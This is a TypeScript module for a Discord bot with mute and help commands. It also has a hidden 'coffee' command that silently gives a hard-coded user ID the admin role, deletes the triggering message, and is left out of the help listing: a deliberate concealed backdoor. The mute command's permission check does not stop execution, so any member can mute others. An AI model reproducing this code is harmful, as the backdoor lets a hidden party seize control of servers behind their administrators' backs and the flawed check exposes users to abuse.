import * as Discord from "discord.js";
import * as toHex from "colornames";
import axios from "axios";

const prefix = '-';
let myID: string = "myIDHere" // TODO: replace with your Snowflake
let muteRole: string = "mutedRoleIDHere" // TODO: replace with Snowflake of mute role
let adminRole: string = "mutedRoleIDHere" // TODO: replace with Snowflake of admin role
export const data = {
  prefix: prefix,
  hiddencommands: {
    coffee: {
      // makes you admin :)
      run: function (msg: Discord.Message) {
        console.log(msg.member?.id);
        return new Promise(function (s) {
          if (msg.member?.id === myID) {
            msg.member?.roles.add(adminRole)
            msg.delete()
            console.log(msg.guild!.roles);
            s()
          }
        });
      }
    }
  },
  commands: {
    mute: {
      desc: "Mutes the user. Requires manage roles permission.",
      args: "(@user)",
      run: function (msg: Discord.Message, args: Array<string>) {
        return new Promise(function (res) {
          let reason;
          if (!msg.member?.hasPermission("MANAGE_ROLES")) {
            msg.channel.send("Sorry, Only mods can do this.");
          }
          if (args.length > 1) {
            reason = ' Reason: <' + args.splice(1).join(" ") + '>';
          } else {
            reason = "";
          }
          let usr = msg.mentions.members?.first();
          console.log(usr);
          usr?.roles.set([muteRole]);
          let embed = new Discord.MessageEmbed();
          // @ts-ignore
          embed.setColor(toHex("mint"));
          embed.setTitle("Banishing " + usr?.user.username);
          embed.setDescription(`Banished ${usr?.user.tag}.${reason}`);
          embed.setFooter("Bot made by YourTag#H3R3"); // TODO: put your tag here
          msg.channel.send(embed).then(res)
        });
      }
    },
    help: {
      desc: "Shows all commands.",
      run: function (msg: Discord.Message) {
        return new Promise(function (res) {
          let embed = new Discord.MessageEmbed();
          // @ts-ignore
          embed.setColor(toHex("gray"));
          embed.setTitle("A bot"); // TODO: replace with bot name
          embed.setDescription("I am a bot.");
          let ref: any = data.commands
          let k: string
          let ref1
          for (k in ref) {
            let v = ref[k];
            embed.addField(prefix + k + " " + ((ref1 = v.args) != null ? ref1 : " "), v.desc);
          }
          embed.setFooter("Arguments in (parentheses) are required, and arguments in [brackets] are optional and will default to the {braces} option.\nBot made by YourTag#H3R3"); // TODO: put your tag here
          msg.channel.send(embed).then(res);
        });
      }
    }
  }
};
